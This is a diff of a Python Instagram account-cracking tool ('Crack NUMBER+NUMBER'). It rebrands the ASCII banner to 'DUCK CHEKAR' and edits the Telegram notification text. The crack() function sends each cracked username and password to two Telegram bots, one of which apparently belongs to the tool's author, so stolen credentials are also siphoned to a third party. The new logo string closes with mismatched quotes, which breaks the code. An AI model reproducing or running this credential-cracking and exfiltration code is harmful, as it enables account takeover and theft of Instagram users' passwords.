@@ -45,19 +45,23 @@ banek='''\x1b[1;97m
  [\033[31m2\x1b[1;97m] Crack NUMBER+NUMBER
  [\033[31m0\x1b[1;97m] Exit Tool
 '''
-logo = '''\x1b[1;96mm 
- ██████╗  █████╗ ██████╗ ██╗  ██╗
-██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
-██║  ██║███████║██████╔╝█████╔╝ 
-██║  ██║██╔══██║██╔══██╗██╔═██╗ 
-██████╔╝██║  ██║██║  ██║██║  ██╗
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    
-  ➣ TOOL BY   ◤DARK◥
-  
-➟-✦✦✦✦✦DARK  HAMA GYAN✦✦✦✦✦✦✦
-
-
- '''
+logo = '''\x1b[1;95mm                                        
+________  ____     ___   ____   ___    __  
+`MMMMMMMb.`MM'     `M'  6MMMMb/ `MM    d'  @
+ MM    `Mb MM       M  8P    YM  MM   d'   
+ MM     MM MM       M 6M      Y  MM  d'    
+ MM     MM MM       M MM         MM d'     
+ MM     MM MM       M MM         MMd'      
+ MM     MM MM       M MM         MMYM.     
+ MM     MM MM       M MM         MM YM.    
+ MM     MM YM       M YM      6  MM  YM.   
+ MM    .M9  8b     d8  8b    d9  MM   YM.  
+_MMMMMMM9'   YMMMMM9    YMMMM9  _MM_   YM._
+                                           
+                                           
+                                           
+  ===  DUCK  CHEKAR  INSTAGRAM FREE  ===
+"""
 logo2 = '\x1b[90;1m=============================\x1b[0;1m'
 
 def reba(bekas):
@@ -166,9 +170,9 @@ def crack():
 			print('\033[31m BAD : '+str(r3))
 			print(logo2)
 			sender =user+' : '+pas
-			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n===========DARK=========\nCh :GOOD<<|' + sender
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=DUCK\nCh :GOOD<<|' + sender
 			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n===========DARK=========\nCh : GOOD<<|' + sender
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=DUCK\nCh : GOOD<<|' + sender
 			responsek = requests.get(send_my)
 			r2+=1
 			os.system('clear')
